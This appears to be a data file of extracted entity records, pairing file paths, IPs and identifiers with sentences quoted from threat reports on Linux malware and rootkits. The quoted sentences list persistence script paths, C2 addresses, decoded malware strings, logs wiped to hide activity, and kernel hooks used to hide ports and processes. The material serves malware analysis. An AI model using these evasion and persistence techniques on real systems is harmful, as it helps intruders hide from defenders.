@@ -1,0 +1,1227 @@
+---
+en_verb: None, m.word: uid, sent: figure 3: similarity between pwnlnx and redxor of the uid and gid used with “lchown” function call
+
+---
+en_verb: None, m.word: gid, sent: figure 3: similarity between pwnlnx and redxor of the uid and gid used with “lchown” function call
+
+---
+en_verb: None, m.word: /usr/syno/etc/rc.d/s99po1kitd-update.sh, sent: the following files are created after executing the malware on boot:
+/usr/syno/etc/rc.d/s99po1kitd-update.sh
+/etc/init.d/po1kitd-update
+/etc/rc2.d/s99po1kitd-update
+the malware checks if the rootkit is active by creating a file and removing it.
+---
+en_verb: None, m.word: /etc/init.d/po1kitd-update, sent: the following files are created after executing the malware on boot:
+/usr/syno/etc/rc.d/s99po1kitd-update.sh
+/etc/init.d/po1kitd-update
+/etc/rc2.d/s99po1kitd-update
+the malware checks if the rootkit is active by creating a file and removing it.
+---
+en_verb: None, m.word: /etc/rc2.d/s99po1kitd-update, sent: the following files are created after executing the malware on boot:
+/usr/syno/etc/rc.d/s99po1kitd-update.sh
+/etc/init.d/po1kitd-update
+/etc/rc2.d/s99po1kitd-update
+the malware checks if the rootkit is active by creating a file and removing it.
+---
+en_verb: hardcode, m.word: 127.0.0.1, sent: table 2: data collected by the malware and sent back to the c2 server
+url key	description	comment
+hostip	ip	hardcoded to 127.0.0.1
+softtype		hardcoded to “linux”
+pscaddr	mac address	
+hostname	machine name	
+hosttar	username	possibly “host target”
+hostos	distribution	extracted from /etc/issue or /etc/redhat-release
+hostcpu	clock speed	/proc/cpuinfo
+hostmem	amount of memory	/proc/meminfo
+hostpack		hardcoded to “linux”
+lkmtag	is rootkit enabled	
+kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.
+---
+en_verb: extract, m.word: /proc/cpuinfo, sent: table 2: data collected by the malware and sent back to the c2 server
+url key	description	comment
+hostip	ip	hardcoded to 127.0.0.1
+softtype		hardcoded to “linux”
+pscaddr	mac address	
+hostname	machine name	
+hosttar	username	possibly “host target”
+hostos	distribution	extracted from /etc/issue or /etc/redhat-release
+hostcpu	clock speed	/proc/cpuinfo
+hostmem	amount of memory	/proc/meminfo
+hostpack		hardcoded to “linux”
+lkmtag	is rootkit enabled	
+kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.
+---
+en_verb: extract, m.word: /proc/meminfo, sent: table 2: data collected by the malware and sent back to the c2 server
+url key	description	comment
+hostip	ip	hardcoded to 127.0.0.1
+softtype		hardcoded to “linux”
+pscaddr	mac address	
+hostname	machine name	
+hosttar	username	possibly “host target”
+hostos	distribution	extracted from /etc/issue or /etc/redhat-release
+hostcpu	clock speed	/proc/cpuinfo
+hostmem	amount of memory	/proc/meminfo
+hostpack		hardcoded to “linux”
+lkmtag	is rootkit enabled	
+kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.
+---
+en_verb: None, m.word: 158.247.208.230, sent: 
+network
+update.cloudjscdn.com 158.247.208.230 34.92.228.216
+process name
+po1kitd-update-k
+
+---
+en_verb: None, m.word: 34.92.228.216, sent: 
+network
+update.cloudjscdn.com 158.247.208.230 34.92.228.216
+process name
+po1kitd-update-k
+
+---
+en_verb: run, m.word: /var/log/wtmp, sent: after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character:
+sensitive file	description
+/root/.bash_history	contains the commands that were run earlier
+/var/log/wtmp	contains login related record for users
+/var/log/btmp	contains record of failed login attempt
+/var/log/lastlog	contains the recent login information for users
+/var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges
+/var/log/boot.log	contains information related to system boot and message logged via system startup processes
+/var/log/cron	contains information related to cron job launch, success and failure error logs
+/var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc.
+---
+en_verb: contain, m.word: /var/log/btmp, sent: after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character:
+sensitive file	description
+/root/.bash_history	contains the commands that were run earlier
+/var/log/wtmp	contains login related record for users
+/var/log/btmp	contains record of failed login attempt
+/var/log/lastlog	contains the recent login information for users
+/var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges
+/var/log/boot.log	contains information related to system boot and message logged via system startup processes
+/var/log/cron	contains information related to cron job launch, success and failure error logs
+/var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc.
+---
+en_verb: contain, m.word: /var/log/lastlog, sent: after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character:
+sensitive file	description
+/root/.bash_history	contains the commands that were run earlier
+/var/log/wtmp	contains login related record for users
+/var/log/btmp	contains record of failed login attempt
+/var/log/lastlog	contains the recent login information for users
+/var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges
+/var/log/boot.log	contains information related to system boot and message logged via system startup processes
+/var/log/cron	contains information related to cron job launch, success and failure error logs
+/var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc.
+---
+en_verb: contain, m.word: /var/log/secure, sent: after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character:
+sensitive file	description
+/root/.bash_history	contains the commands that were run earlier
+/var/log/wtmp	contains login related record for users
+/var/log/btmp	contains record of failed login attempt
+/var/log/lastlog	contains the recent login information for users
+/var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges
+/var/log/boot.log	contains information related to system boot and message logged via system startup processes
+/var/log/cron	contains information related to cron job launch, success and failure error logs
+/var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc.
+---
+en_verb: contain, m.word: /var/log/boot.log, sent: after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character:
+sensitive file	description
+/root/.bash_history	contains the commands that were run earlier
+/var/log/wtmp	contains login related record for users
+/var/log/btmp	contains record of failed login attempt
+/var/log/lastlog	contains the recent login information for users
+/var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges
+/var/log/boot.log	contains information related to system boot and message logged via system startup processes
+/var/log/cron	contains information related to cron job launch, success and failure error logs
+/var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc.
+---
+en_verb: contain, m.word: /var/log/cron, sent: after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character:
+sensitive file	description
+/root/.bash_history	contains the commands that were run earlier
+/var/log/wtmp	contains login related record for users
+/var/log/btmp	contains record of failed login attempt
+/var/log/lastlog	contains the recent login information for users
+/var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges
+/var/log/boot.log	contains information related to system boot and message logged via system startup processes
+/var/log/cron	contains information related to cron job launch, success and failure error logs
+/var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc.
+---
+en_verb: relate, m.word: /var/log/dmesg, sent: after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character:
+sensitive file	description
+/root/.bash_history	contains the commands that were run earlier
+/var/log/wtmp	contains login related record for users
+/var/log/btmp	contains record of failed login attempt
+/var/log/lastlog	contains the recent login information for users
+/var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges
+/var/log/boot.log	contains information related to system boot and message logged via system startup processes
+/var/log/cron	contains information related to cron job launch, success and failure error logs
+/var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc.
+---
+en_verb: contain, m.word: /var/log/firewalld, sent: /var/log/firewalld	contains logs related to firewall activities
+/var/log/maillog	contains information related to a mail server running on the system
+/var/log/messages	contains generic system activity messages
+/var/log/spooler	contains messages from usenet
+/var/log/syslog	contains generic system activity messages
+/var/log/yum.log	contains the package logs related to installation\remove\update activities done via yum utility
+screenshot of the remote bash script command used for initial access
+figure 3. remote bash script command used for initial access
+
+---
+en_verb: contain, m.word: /var/log/maillog, sent: /var/log/firewalld	contains logs related to firewall activities
+/var/log/maillog	contains information related to a mail server running on the system
+/var/log/messages	contains generic system activity messages
+/var/log/spooler	contains messages from usenet
+/var/log/syslog	contains generic system activity messages
+/var/log/yum.log	contains the package logs related to installation\remove\update activities done via yum utility
+screenshot of the remote bash script command used for initial access
+figure 3. remote bash script command used for initial access
+
+---
+en_verb: run, m.word: /var/log/messages, sent: /var/log/firewalld	contains logs related to firewall activities
+/var/log/maillog	contains information related to a mail server running on the system
+/var/log/messages	contains generic system activity messages
+/var/log/spooler	contains messages from usenet
+/var/log/syslog	contains generic system activity messages
+/var/log/yum.log	contains the package logs related to installation\remove\update activities done via yum utility
+screenshot of the remote bash script command used for initial access
+figure 3. remote bash script command used for initial access
+
+---
+en_verb: contain, m.word: /var/log/spooler, sent: /var/log/firewalld	contains logs related to firewall activities
+/var/log/maillog	contains information related to a mail server running on the system
+/var/log/messages	contains generic system activity messages
+/var/log/spooler	contains messages from usenet
+/var/log/syslog	contains generic system activity messages
+/var/log/yum.log	contains the package logs related to installation\remove\update activities done via yum utility
+screenshot of the remote bash script command used for initial access
+figure 3. remote bash script command used for initial access
+
+---
+en_verb: contain, m.word: /var/log/syslog, sent: /var/log/firewalld	contains logs related to firewall activities
+/var/log/maillog	contains information related to a mail server running on the system
+/var/log/messages	contains generic system activity messages
+/var/log/spooler	contains messages from usenet
+/var/log/syslog	contains generic system activity messages
+/var/log/yum.log	contains the package logs related to installation\remove\update activities done via yum utility
+screenshot of the remote bash script command used for initial access
+figure 3. remote bash script command used for initial access
+
+---
+en_verb: contain, m.word: /var/log/yum.log, sent: /var/log/firewalld	contains logs related to firewall activities
+/var/log/maillog	contains information related to a mail server running on the system
+/var/log/messages	contains generic system activity messages
+/var/log/spooler	contains messages from usenet
+/var/log/syslog	contains generic system activity messages
+/var/log/yum.log	contains the package logs related to installation\remove\update activities done via yum utility
+screenshot of the remote bash script command used for initial access
+figure 3. remote bash script command used for initial access
+
+---
+en_verb: m6_6n3, m.word: /var/run/gcc.pid, sent: encrypted strings	decoded value
+m7a4nq_/na	/usr/bin/
+m [(n3	/bin/
+m6_6n3	/tmp/
+m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid
+m.[$n__#4%\c\x1ab]0	/lib/libudev.so
+m.[$n3	/lib/
+m4s4nac/na	/var/run/
+!#ff3ve.-7\x17v[_	cat resolv.conf
+<encrypted_remote_url>	hxxp://aa.hostasa[.
+---
+en_verb: m6_6n3, m.word: /var/run/gcc.pid, sent: encrypted strings	decoded value
+m7a4nq_/na	/usr/bin/
+m [(n3	/bin/
+m6_6n3	/tmp/
+m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid
+m.[$n__#4%\c\x1ab]0	/lib/libudev.so
+m.[$n3	/lib/
+m4s4nac/na	/var/run/
+!#ff3ve.-7\x17v[_	cat resolv.conf
+<encrypted_remote_url>	hxxp://aa.hostasa[.
+---
+en_verb: m6_6n3, m.word: /var/run/gcc.pid, sent: encrypted strings	decoded value
+m7a4nq_/na	/usr/bin/
+m [(n3	/bin/
+m6_6n3	/tmp/
+m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid
+m.[$n__#4%\c\x1ab]0	/lib/libudev.so
+m.[$n3	/lib/
+m4s4nac/na	/var/run/
+!#ff3ve.-7\x17v[_	cat resolv.conf
+<encrypted_remote_url>	hxxp://aa.hostasa[.
+---
+en_verb: resolv.conf, m.word: /var/run/, sent: encrypted strings	decoded value
+m7a4nq_/na	/usr/bin/
+m [(n3	/bin/
+m6_6n3	/tmp/
+m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid
+m.[$n__#4%\c\x1ab]0	/lib/libudev.so
+m.[$n3	/lib/
+m4s4nac/na	/var/run/
+!#ff3ve.-7\x17v[_	cat resolv.conf
+<encrypted_remote_url>	hxxp://aa.hostasa[.
+---
+en_verb: resolv.conf, m.word: /var/run/, sent: encrypted strings	decoded value
+m7a4nq_/na	/usr/bin/
+m [(n3	/bin/
+m6_6n3	/tmp/
+m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid
+m.[$n__#4%\c\x1ab]0	/lib/libudev.so
+m.[$n3	/lib/
+m4s4nac/na	/var/run/
+!#ff3ve.-7\x17v[_	cat resolv.conf
+<encrypted_remote_url>	hxxp://aa.hostasa[.
+---
+en_verb: resolv.conf, m.word: /var/run/, sent: encrypted strings	decoded value
+m7a4nq_/na	/usr/bin/
+m [(n3	/bin/
+m6_6n3	/tmp/
+m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid
+m.[$n__#4%\c\x1ab]0	/lib/libudev.so
+m.[$n3	/lib/
+m4s4nac/na	/var/run/
+!#ff3ve.-7\x17v[_	cat resolv.conf
+<encrypted_remote_url>	hxxp://aa.hostasa[.
+---
+en_verb: assign, m.word: gid, sent: 
+the following table describes the symbols found in the rootkit and their corresponding functionalities:
+
+function name  	description  
+give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0”
+module_hide	hides the rootkit kernel module
+module_show	unhides the rootkit kernel module
+get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6
+get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6
+hide_udp4_port	adds a provided port to a list of hidden udp4 ports
+unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports
+hide_udp6_port	adds a provided port to a list of hidden udp6 ports
+unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports
+hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports
+unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports
+hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports
+unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports
+unhide_allz	iterates list of all hidden ports and deletes all entries
+firewall_acceptip	adds an ip address provided to accept_ips list
+unfirewall_acceptip	deletes a provided entry from accept_ips list
+firewall_dropip	adds a provided ip address to drop_ips list
+unfirewall_dropip	deletes a provided ip address to drop_ips list
+hide_proc	adds a provided entry to hidden_procs list
+unhide_proc	deletes a provided entry to hidden_procs list
+
+---
+en_verb: hook, m.word: /proc/net/udphides, sent: 
+the following table describes the symbols found in the rootkit and their corresponding functionalities:
+
+function name  	description  
+give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0”
+module_hide	hides the rootkit kernel module
+module_show	unhides the rootkit kernel module
+get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6
+get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6
+hide_udp4_port	adds a provided port to a list of hidden udp4 ports
+unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports
+hide_udp6_port	adds a provided port to a list of hidden udp6 ports
+unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports
+hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports
+unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports
+hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports
+unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports
+unhide_allz	iterates list of all hidden ports and deletes all entries
+firewall_acceptip	adds an ip address provided to accept_ips list
+unfirewall_acceptip	deletes a provided entry from accept_ips list
+firewall_dropip	adds a provided ip address to drop_ips list
+unfirewall_dropip	deletes a provided ip address to drop_ips list
+hide_proc	adds a provided entry to hidden_procs list
+unhide_proc	deletes a provided entry to hidden_procs list
+
+---
+en_verb: hook, m.word: /proc/net/udp6, sent: 
+the following table describes the symbols found in the rootkit and their corresponding functionalities:
+
+function name  	description  
+give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0”
+module_hide	hides the rootkit kernel module
+module_show	unhides the rootkit kernel module
+get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6
+get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6
+hide_udp4_port	adds a provided port to a list of hidden udp4 ports
+unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports
+hide_udp6_port	adds a provided port to a list of hidden udp6 ports
+unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports
+hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports
+unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports
+hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports
+unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports
+unhide_allz	iterates list of all hidden ports and deletes all entries
+firewall_acceptip	adds an ip address provided to accept_ips list
+unfirewall_acceptip	deletes a provided entry from accept_ips list
+firewall_dropip	adds a provided ip address to drop_ips list
+unfirewall_dropip	deletes a provided ip address to drop_ips list
+hide_proc	adds a provided entry to hidden_procs list
+unhide_proc	deletes a provided entry to hidden_procs list
+
+---
+en_verb: provide, m.word: /proc/net/tcphides, sent: 
+the following table describes the symbols found in the rootkit and their corresponding functionalities:
+
+function name  	description  
+give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0”
+module_hide	hides the rootkit kernel module
+module_show	unhides the rootkit kernel module
+get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6
+get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6
+hide_udp4_port	adds a provided port to a list of hidden udp4 ports
+unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports
+hide_udp6_port	adds a provided port to a list of hidden udp6 ports
+unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports
+hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports
+unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports
+hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports
+unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports
+unhide_allz	iterates list of all hidden ports and deletes all entries
+firewall_acceptip	adds an ip address provided to accept_ips list
+unfirewall_acceptip	deletes a provided entry from accept_ips list
+firewall_dropip	adds a provided ip address to drop_ips list
+unfirewall_dropip	deletes a provided ip address to drop_ips list
+hide_proc	adds a provided entry to hidden_procs list
+unhide_proc	deletes a provided entry to hidden_procs list
+
+---
+en_verb: provide, m.word: /proc/net/tcp6, sent: 
+the following table describes the symbols found in the rootkit and their corresponding functionalities:
+
+function name  	description  
+give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0”
+module_hide	hides the rootkit kernel module
+module_show	unhides the rootkit kernel module
+get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6
+get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6
+hide_udp4_port	adds a provided port to a list of hidden udp4 ports
+unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports
+hide_udp6_port	adds a provided port to a list of hidden udp6 ports
+unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports
+hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports
+unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports
+hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports
+unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports
+unhide_allz	iterates list of all hidden ports and deletes all entries
+firewall_acceptip	adds an ip address provided to accept_ips list
+unfirewall_acceptip	deletes a provided entry from accept_ips list
+firewall_dropip	adds a provided ip address to drop_ips list
+unfirewall_dropip	deletes a provided ip address to drop_ips list
+hide_proc	adds a provided entry to hidden_procs list
+unhide_proc	deletes a provided entry to hidden_procs list
+
+---
+en_verb: contain, m.word: /proc/7728, sent: a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:
+
+/proc/7728 – contains process-id (pid) 7728-related information
+/proc/698 – contains pid 698-related information
+running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command.
+---
+en_verb: contain, m.word: /proc/698, sent: a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:
+
+/proc/7728 – contains process-id (pid) 7728-related information
+/proc/698 – contains pid 698-related information
+running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command.
+---
+en_verb: check, m.word: /proc/$pid, sent: a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:
+
+/proc/7728 – contains process-id (pid) 7728-related information
+/proc/698 – contains pid 698-related information
+running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command.
+---
+en_verb: None, m.word: open(“/proc/3922/status”,, sent: > strace -e open ps
+open(“/proc/3922/status”, o_rdonly)     = 6
+open(“/proc/4324/stat”, o_rdonly)       = 6
+open(“/proc/4324/status”, o_rdonly)     = 6
+open(“/proc/5559/stat”, o_rdonly)       = 6
+open(“/proc/5559/status”, o_rdonly)     = 6
+open(“/proc/5960/stat”, o_rdonly)       = 6
+open(“/proc/5960/status”, o_rdonly)     = 6
+open(“/proc/5978/stat”, o_rdonly)       = 6
+open(“/proc/5978/status”, o_rdonly)     = 6
+if the malware hides the $pid specific directory, it can conceal fetching the corresponding process from a user mode.
+---
+en_verb: None, m.word: open(“/proc/4324/stat”,, sent: > strace -e open ps
+open(“/proc/3922/status”, o_rdonly)     = 6
+open(“/proc/4324/stat”, o_rdonly)       = 6
+open(“/proc/4324/status”, o_rdonly)     = 6
+open(“/proc/5559/stat”, o_rdonly)       = 6
+open(“/proc/5559/status”, o_rdonly)     = 6
+open(“/proc/5960/stat”, o_rdonly)       = 6
+open(“/proc/5960/status”, o_rdonly)     = 6
+open(“/proc/5978/stat”, o_rdonly)       = 6
+open(“/proc/5978/status”, o_rdonly)     = 6
+if the malware hides the $pid specific directory, it can conceal fetching the corresponding process from a user mode.
+---
+en_verb: None, m.word: open(“/proc/4324/status”,, sent: > strace -e open ps
+open(“/proc/3922/status”, o_rdonly)     = 6
+open(“/proc/4324/stat”, o_rdonly)       = 6
+open(“/proc/4324/status”, o_rdonly)     = 6
+open(“/proc/5559/stat”, o_rdonly)       = 6
+open(“/proc/5559/status”, o_rdonly)     = 6
+open(“/proc/5960/stat”, o_rdonly)       = 6
+open(“/proc/5960/status”, o_rdonly)     = 6
+open(“/proc/5978/stat”, o_rdonly)       = 6
+open(“/proc/5978/status”, o_rdonly)     = 6
+if the malware hides the $pid specific directory, it can conceal fetching the corresponding process from a user mode.
+---
+en_verb: None, m.word: open(“/proc/5559/stat”,, sent: > strace -e open ps
+open(“/proc/3922/status”, o_rdonly)     = 6
+open(“/proc/4324/stat”, o_rdonly)       = 6
+open(“/proc/4324/status”, o_rdonly)     = 6
+open(“/proc/5559/stat”, o_rdonly)       = 6
+open(“/proc/5559/status”, o_rdonly)     = 6
+open(“/proc/5960/stat”, o_rdonly)       = 6
+open(“/proc/5960/status”, o_rdonly)     = 6
+open(“/proc/5978/stat”, o_rdonly)       = 6
+open(“/proc/5978/status”, o_rdonly)     = 6
+if the malware hides the $pid specific directory, it can conceal fetching the corresponding process from a user mode.
+---
+en_verb: None, m.word: open(“/proc/5559/status”,, sent: > strace -e open ps
+open(“/proc/3922/status”, o_rdonly)     = 6
+open(“/proc/4324/stat”, o_rdonly)       = 6
+open(“/proc/4324/status”, o_rdonly)     = 6
+open(“/proc/5559/stat”, o_rdonly)       = 6
+open(“/proc/5559/status”, o_rdonly)     = 6
+open(“/proc/5960/stat”, o_rdonly)       = 6
+open(“/proc/5960/status”, o_rdonly)     = 6
+open(“/proc/5978/stat”, o_rdonly)       = 6
+open(“/proc/5978/status”, o_rdonly)     = 6
+if the malware hides the $pid specific directory, it can conceal fetching the corresponding process from a user mode.
+---
+en_verb: None, m.word: open(“/proc/5960/stat”,, sent: > strace -e open ps
+open(“/proc/3922/status”, o_rdonly)     = 6
+open(“/proc/4324/stat”, o_rdonly)       = 6
+open(“/proc/4324/status”, o_rdonly)     = 6
+open(“/proc/5559/stat”, o_rdonly)       = 6
+open(“/proc/5559/status”, o_rdonly)     = 6
+open(“/proc/5960/stat”, o_rdonly)       = 6
+open(“/proc/5960/status”, o_rdonly)     = 6
+open(“/proc/5978/stat”, o_rdonly)       = 6
+open(“/proc/5978/status”, o_rdonly)     = 6
+if the malware hides the $pid specific directory, it can conceal fetching the corresponding process from a user mode.
+---
+en_verb: None, m.word: open(“/proc/5960/status”,, sent: > strace -e open ps
+open(“/proc/3922/status”, o_rdonly)     = 6
+open(“/proc/4324/stat”, o_rdonly)       = 6
+open(“/proc/4324/status”, o_rdonly)     = 6
+open(“/proc/5559/stat”, o_rdonly)       = 6
+open(“/proc/5559/status”, o_rdonly)     = 6
+open(“/proc/5960/stat”, o_rdonly)       = 6
+open(“/proc/5960/status”, o_rdonly)     = 6
+open(“/proc/5978/stat”, o_rdonly)       = 6
+open(“/proc/5978/status”, o_rdonly)     = 6
+if the malware hides the $pid specific directory, it can conceal fetching the corresponding process from a user mode.
+---
+en_verb: None, m.word: open(“/proc/5978/stat”,, sent: > strace -e open ps
+open(“/proc/3922/status”, o_rdonly)     = 6
+open(“/proc/4324/stat”, o_rdonly)       = 6
+open(“/proc/4324/status”, o_rdonly)     = 6
+open(“/proc/5559/stat”, o_rdonly)       = 6
+open(“/proc/5559/status”, o_rdonly)     = 6
+open(“/proc/5960/stat”, o_rdonly)       = 6
+open(“/proc/5960/status”, o_rdonly)     = 6
+open(“/proc/5978/stat”, o_rdonly)       = 6
+open(“/proc/5978/status”, o_rdonly)     = 6
+if the malware hides the $pid specific directory, it can conceal fetching the corresponding process from a user mode.
+---
+en_verb: None, m.word: open(“/proc/5978/status”,, sent: > strace -e open ps
+open(“/proc/3922/status”, o_rdonly)     = 6
+open(“/proc/4324/stat”, o_rdonly)       = 6
+open(“/proc/4324/status”, o_rdonly)     = 6
+open(“/proc/5559/stat”, o_rdonly)       = 6
+open(“/proc/5559/status”, o_rdonly)     = 6
+open(“/proc/5960/stat”, o_rdonly)       = 6
+open(“/proc/5960/status”, o_rdonly)     = 6
+open(“/proc/5978/stat”, o_rdonly)       = 6
+open(“/proc/5978/status”, o_rdonly)     = 6
+if the malware hides the $pid specific directory, it can conceal fetching the corresponding process from a user mode.
+---
+en_verb: have, m.word: /proc/rs_dev, sent: in this case, the malware has a provision for communicating with its rootkit component /proc/rs_dev by sending input and output control (ioctl) calls with additional information to take appropriate action.
+---
+en_verb: have, m.word: /proc/rs_dev, sent: in this case, the malware has a provision for communicating with its rootkit component /proc/rs_dev by sending input and output control (ioctl) calls with additional information to take appropriate action.
+---
+en_verb: provide, m.word: /proc/net, sent: the /proc/net interface provides information about currently active tcp connections and is implemented by kernel apis tcp4_seq_show() and tcp6_seq_show() .
+---
+en_verb: name, m.word: /proc/net/tcp, sent: utilities, such as netstat, acquire tcp/udp connection information from files named /proc/net/tcp and /proc/net/udp.
+---
+en_verb: None, m.word: /proc/net/udp., sent: utilities, such as netstat, acquire tcp/udp connection information from files named /proc/net/tcp and /proc/net/udp.
+---
+en_verb: None, m.word: /proc/net/tcp,, sent: the following table lists kernel apis and their hook names used by the rootkit:
+
+kernel api	hooked function by rootkit	function description
+tcp4_seq_show()	n_tcp4_seq_show()	hiding /proc/net/tcp, tcpv4 connection
+tcp6_seq_show()	n_tcp6_seq_show()	hiding /proc/net/tcp6, tcpv6 connection
+udp4_seq_show()	n_ udp4_seq_show()	hiding /proc/net/udp, udpv4 connection
+udp6_seq_show()	n_ udp6_seq_show()	hiding /proc/net/udp6, udpv4 connection
+persistence mechanisms
+xorddos uses various persistence mechanisms to support different linux distributions when automatically launching upon system startup, as detailed below.
+---
+en_verb: None, m.word: /proc/net/tcp6,, sent: the following table lists kernel apis and their hook names used by the rootkit:
+
+kernel api	hooked function by rootkit	function description
+tcp4_seq_show()	n_tcp4_seq_show()	hiding /proc/net/tcp, tcpv4 connection
+tcp6_seq_show()	n_tcp6_seq_show()	hiding /proc/net/tcp6, tcpv6 connection
+udp4_seq_show()	n_ udp4_seq_show()	hiding /proc/net/udp, udpv4 connection
+udp6_seq_show()	n_ udp6_seq_show()	hiding /proc/net/udp6, udpv4 connection
+persistence mechanisms
+xorddos uses various persistence mechanisms to support different linux distributions when automatically launching upon system startup, as detailed below.
+---
+en_verb: None, m.word: /proc/net/udp,, sent: the following table lists kernel apis and their hook names used by the rootkit:
+
+kernel api	hooked function by rootkit	function description
+tcp4_seq_show()	n_tcp4_seq_show()	hiding /proc/net/tcp, tcpv4 connection
+tcp6_seq_show()	n_tcp6_seq_show()	hiding /proc/net/tcp6, tcpv6 connection
+udp4_seq_show()	n_ udp4_seq_show()	hiding /proc/net/udp, udpv4 connection
+udp6_seq_show()	n_ udp6_seq_show()	hiding /proc/net/udp6, udpv4 connection
+persistence mechanisms
+xorddos uses various persistence mechanisms to support different linux distributions when automatically launching upon system startup, as detailed below.
+---
+en_verb: None, m.word: /proc/net/udp6,, sent: the following table lists kernel apis and their hook names used by the rootkit:
+
+kernel api	hooked function by rootkit	function description
+tcp4_seq_show()	n_tcp4_seq_show()	hiding /proc/net/tcp, tcpv4 connection
+tcp6_seq_show()	n_tcp6_seq_show()	hiding /proc/net/tcp6, tcpv6 connection
+udp4_seq_show()	n_ udp4_seq_show()	hiding /proc/net/udp, udpv4 connection
+udp6_seq_show()	n_ udp6_seq_show()	hiding /proc/net/udp6, udpv4 connection
+persistence mechanisms
+xorddos uses various persistence mechanisms to support different linux distributions when automatically launching upon system startup, as detailed below.
+---
+en_verb: None, m.word: /etc/init.d/hflggwyfsc.elf., sent: screenshot of the content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf.
+---
+en_verb: drop, m.word: /etc/init.d/hflggwyfsc.elf, sent: figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf
+
+---
